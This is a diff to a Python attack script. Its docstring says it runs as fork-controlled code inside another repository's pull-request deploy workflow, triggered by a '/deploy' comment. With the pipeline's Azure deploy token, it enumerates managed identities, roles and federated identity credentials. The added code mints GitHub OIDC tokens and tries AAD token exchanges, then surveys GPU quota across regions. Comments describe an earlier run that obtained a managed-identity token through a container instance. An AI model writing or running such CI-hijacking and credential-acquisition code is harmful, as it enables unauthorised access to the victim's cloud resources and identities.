@@ -1,6 +1,8 @@
 #!/usr/bin/env python3
-"""C211-I121713 v2: Azure managed-identity (UAMI) credential acquisition + UAMI federated
-identity credential (FIC) enumeration, additive to the same single handoff row.
+"""C211-I121713 v3: no-compute completion pass (the single mandated ACI already ran and was
+deleted in run 1). Re-reads the UAMI/role/FIC matrix, records the SSP-token GPU family quota
+matrix with the corrected standardN[CDV] filter, and captures the verbatim AAD oracle refusal
+for the one existing UAMI FIC whose subject the in-job GitHub token cannot satisfy.
 
 Runs as the fork-controlled infra/deploy.ps1 -> this file inside the base repo's
 'Deploy Pull Request to Staging Slot' workflow (issue_comment '/deploy'), AFTER
@@ -516,6 +518,12 @@ def phase_fic(tok, sid, tenant, uamis, extra):
                     break
             if not matched:
                 rec["verdict"] = "subject-not-satisfiable-by-injob-token"
+                jwt, claims = mint_github_token((auds or ["api://AzureADTokenExchange"])[0])
+                if jwt and u.get("clientId") and tenant:
+                    _at, xrec = aad_exchange(tenant, u["clientId"], jwt)
+                    rec["oracle_exchange"] = xrec
+                    rec["oracle_note"] = ("verbatim AAD refusal with the in-job GitHub token "
+                                          "whose subject differs from the FIC subject")
             rec["tried"] = tried
             results.append(rec)
             emit({"step": "fic", **rec})
@@ -668,6 +676,32 @@ def phase_aci(tok, sid, chosen, inner_b64):
     return {"content": content, "post": post, "absent_http": stg}
 
 
+def phase_gpu(tok, sid):
+    "Corrected GPU-family quota matrix read with the deploy SP token (subscription-wide)."
+    out = []
+    for region in ("australiaeast", "eastus", "westeurope", "westus2"):
+        if left() < 500:
+            break
+        st, raw = arm(tok, "/subscriptions/%s/providers/Microsoft.Compute/locations/%s"
+                           "/usages?api-version=2024-07-01" % (sid, region))
+        d = jload(raw) or {}
+        rows = []
+        for u in (d.get("value") or []):
+            nm = ((u.get("name") or {}).get("value") or "")
+            low = nm.lower()
+            if low.startswith(GPU_FAMILY_PREFIX) or "gpu" in low:
+                rows.append({"name": nm, "current": u.get("currentValue"),
+                             "limit": u.get("limit"), "unit": u.get("unit")})
+        avail = [r for r in rows if r.get("current") is not None
+                 and r.get("limit") is not None and r.get("current") < r.get("limit")]
+        rec = {"region": region, "http": st, "n": len(rows), "rows": rows[:40],
+               "with_available_quota": avail[:10],
+               "err": (err_of(st, raw) if st != 200 else None)}
+        out.append(rec)
+        emit({"step": "gpu-family", **rec})
+    return out
+
+
 def main():
     emit({"step": "start", "sid_default": SID_DEFAULT, "rg": RG, "deadline": DEADLINE})
     tok = get_arm_token()
@@ -708,25 +742,12 @@ def main():
                      if u.get("name") == chosen["name"] and u.get("rg") == chosen["rg"]), None)
         chosen = dict(chosen, **(full or {}))
     emit({"step": "chosen", "chosen": chosen})
-    inner_path = os.path.join(os.path.dirname(os.path.abspath(__file__)),
-                              "c211_i121713_inner_v2.py")
-    inner_b64 = None
-    try:
-        with open(inner_path, "rb") as f:
-            inner_b64 = base64.b64encode(f.read()).decode()
-    except Exception as e:  # noqa: BLE001
-        emit({"step": "fatal", "why": "inner v2 missing", "err": str(e)[:200]})
-        return
-    emit({"step": "inner-loaded", "b64_len": len(inner_b64)})
-    result = phase_aci(tok, sid, chosen, inner_b64) if chosen else None
+    # v3: NO compute vehicle. The single mandated CPU-only ACI already ran with the
+    # best-ranked identity (run 1: attach 201, IMDS token 200, delete 200, GET 404) and the
+    # container group was proven absent, so no second vehicle is created here.
+    result = None
     inner_lines = []
-    if result and result.get("content"):
-        for line in result["content"].splitlines():
-            if line.startswith("C211_I121713_IN "):
-                try:
-                    inner_lines.append(json.loads(line.split(" ", 1)[1]))
-                except Exception:  # noqa: BLE001
-                    pass
+    gpu_ssp = phase_gpu(tok, sid)
     subs_in = next((x for x in inner_lines if x.get("step") == "subs"), None)
     nonzero = next((x for x in inner_lines if x.get("step") == "marker-eval"), None)
     acr = [{"reg": x.get("reg"), "http": x.get("http"),
@@ -747,6 +768,7 @@ def main():
           "role_rows": len(rows), "roles_mine": len(mine), "chosen": chosen,
           "subs_visible": (subs_in or {}).get("subs"),
           "acr": acr, "kv": kv, "gpu": gpu, "marker_eval": nonzero,
+          "gpu_ssp": gpu_ssp,
           "fic_n": len(fic_results),
           "fic_verdicts": {r.get("fic", "") + "@" + str(r.get("uami")): r.get("verdict")
                            for r in fic_results},
